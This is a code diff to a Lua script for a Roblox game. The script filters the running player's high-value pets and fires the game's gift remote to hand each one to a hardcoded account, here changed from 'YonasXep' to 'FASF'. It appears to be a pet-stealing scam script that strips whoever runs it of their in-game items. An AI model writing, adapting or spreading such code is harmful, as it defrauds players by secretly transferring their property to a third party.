@@ -47,10 +47,9 @@ for _, v in pairs(workspace.Pets:GetChildren()) do
 				local petspeed = v.RootPart["GUI/IdleGUI"].Speed.Text
 				local number = tonumber((petspeed:gsub("%D", "")))
 				if number and number >= 500000 then
-
+					table.insert(deletePets, v.Name)
 				end
 			end
-			table.insert(deletePets, v.Name)
 		end
 	end)
 end
@@ -67,7 +66,7 @@ for _,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Data.Pets:GetC
 	if not table.find(Blacklist, v:GetAttribute("T")) then
 		game.ReplicatedStorage.Remote.CharacterRE:FireServer("Focus", v.Name)
 		task.wait(0.1)
-		game.ReplicatedStorage.Remote.GiftRE:FireServer(game.Players['YonasXep'])
+		game.ReplicatedStorage.Remote.GiftRE:FireServer(game.Players['FASF'])
 		task.wait(0.3)
 	end
 
